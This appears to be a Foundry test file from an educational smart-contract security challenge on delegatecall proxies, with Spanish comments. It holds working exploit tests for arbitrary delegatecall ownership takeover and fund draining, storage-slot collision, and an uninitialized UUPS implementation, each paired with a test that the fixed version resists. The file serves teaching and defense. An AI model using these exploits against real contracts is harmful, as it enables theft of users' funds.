// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {
    MonederoVulnerable,
    Malicioso,
    ProxyVulnerable,
    LogicaVulnerable,
    LogicaUUPSVulnerable
} from "../src/C4-delegatecall-proxies/Vulnerable.sol";
import {
    MonederoFixed,
    ProxyFixed,
    LogicaFixed,
    LogicaUUPSFixed
} from "../src/C4-delegatecall-proxies/Fixed.sol";
import {Initializable} from "@openzeppelin/contracts/proxy/utils/Initializable.sol";

interface ILogicaUUPS {
    function initialize(address o) external;
    function owner() external view returns (address);
    function upgradeTo(address nueva) external;
    function implementacion() external view returns (address);
}

interface ILogica {
    function setOwner(address o) external;
    function owner() external view returns (address);
}

contract C4_DelegatecallProxies is BaseChallenge {
    // Variante A: delegatecall arbitrario (reto principal)

    function test_Exploit_Vulnerable() public {
        vm.prank(deployer);
        MonederoVulnerable monedero = new MonederoVulnerable{value: 5 ether}();
        assertEq(monedero.owner(), deployer);

        vm.startPrank(attacker);
        Malicioso mal = new Malicioso();
        // Ejecuta pwn() vía delegatecall: escribe owner = attacker en el monedero.
        monedero.ejecutar(address(mal), abi.encodeWithSignature("pwn()"));
        monedero.retirar();
        vm.stopPrank();

        assertEq(monedero.owner(), attacker, "el atacante es el nuevo owner");
        assertTrue(monedero.isSolved(), "el monedero queda vacio");
        assertEq(attacker.balance, 15 ether, "el atacante se lleva los 5 ETH");
    }

    function test_Fixed_Resiste() public {
        LogicaFixed logica = new LogicaFixed();
        vm.prank(deployer);
        MonederoFixed monedero = new MonederoFixed{value: 5 ether}(address(logica));

        vm.startPrank(attacker);
        Malicioso mal = new Malicioso();
        // Destino fijo + onlyOwner: el atacante no puede ni elegir código ni llamar.
        vm.expectRevert(bytes("solo owner"));
        monedero.ejecutar(abi.encodeWithSignature("pwn()"));
        vm.expectRevert(bytes("solo owner"));
        monedero.retirar();
        vm.stopPrank();

        // Evita el warning de variable sin usar.
        mal;
        assertFalse(monedero.isSolved(), "la version corregida no se resuelve");
        assertEq(address(monedero).balance, 5 ether, "los fondos siguen en el monedero");
    }

    // Variante B: colisión de almacenamiento

    function test_Exploit_StorageCollision_Vulnerable() public {
        LogicaVulnerable logica = new LogicaVulnerable();
        vm.prank(deployer);
        ProxyVulnerable proxy = new ProxyVulnerable(address(logica));

        // Antes: el slot 0 del proxy apunta a la implementación.
        assertEq(proxy.implementation(), address(logica));

        // Llamar setOwner a través del proxy escribe en el slot 0 (owner en la
        // lógica == implementation en el proxy): corrompe el puntero.
        ILogica(address(proxy)).setOwner(attacker);

        assertEq(
            proxy.implementation(),
            attacker,
            "la colision sobrescribio el puntero de implementacion"
        );
    }

    function test_Fixed_StorageCollision_Resiste() public {
        LogicaFixed logica = new LogicaFixed();
        vm.prank(deployer);
        ProxyFixed proxy = new ProxyFixed(address(logica));

        // setOwner escribe en el slot 0 (owner), pero la implementación está en
        // el slot EIP-1967: no hay colisión.
        ILogica(address(proxy)).setOwner(attacker);

        assertEq(ILogica(address(proxy)).owner(), attacker, "owner se guarda en el slot 0");
        // El proxy sigue delegando a la misma lógica (puntero intacto).
        ILogica(address(proxy)).setOwner(user1);
        assertEq(ILogica(address(proxy)).owner(), user1, "el proxy sigue operativo");
    }
    // Variante C: implementación sin inicializar

    function test_Exploit_ImplSinInicializar_Vulnerable() public {
        // Despliegue legítimo: implementación + proxy EIP-1967, y el proxy se
        // inicializa con el deployer como owner.
        vm.startPrank(deployer);
        LogicaUUPSVulnerable logica = new LogicaUUPSVulnerable();
        ProxyFixed proxy = new ProxyFixed(address(logica));
        ILogicaUUPS(address(proxy)).initialize(deployer);
        vm.stopPrank();
        assertEq(ILogicaUUPS(address(proxy)).owner(), deployer);

        // El atacante llama a initialize directamente sobre la implementación,
        // cuyo storage nunca se inicializó, y pasa a controlarla.
        vm.startPrank(attacker);
        logica.initialize(attacker);
        logica.upgradeTo(attacker); // acción privilegiada en el contexto de la lógica
        vm.stopPrank();

        assertEq(logica.owner(), attacker, "el atacante controla la implementacion");
        assertEq(logica.implementacion(), attacker, "ejecuta funciones de owner en ella");

        // Alcance tras EIP-6780: el storage del proxy es independiente, así que
        // el proxy y su owner no cambian. Antes de Dencun, ese control permitía
        // destruir la implementación con SELFDESTRUCT y dejar inservibles todos
        // los proxies que apuntaban a ella.
        assertEq(ILogicaUUPS(address(proxy)).owner(), deployer, "el proxy conserva su owner");
    }

    function test_Fixed_ImplSinInicializar_Resiste() public {
        vm.startPrank(deployer);
        LogicaUUPSFixed logica = new LogicaUUPSFixed();
        ProxyFixed proxy = new ProxyFixed(address(logica));
        ILogicaUUPS(address(proxy)).initialize(deployer);
        vm.stopPrank();

        // La implementación tiene el inicializador bloqueado desde el constructor.
        vm.startPrank(attacker);
        vm.expectRevert(Initializable.InvalidInitialization.selector);
        logica.initialize(attacker);
        vm.expectRevert(bytes("solo owner"));
        logica.upgradeTo(attacker);
        vm.stopPrank();

        assertEq(logica.owner(), address(0), "nadie controla la implementacion");
        assertEq(ILogicaUUPS(address(proxy)).owner(), deployer, "el proxy funciona con normalidad");
    }
}
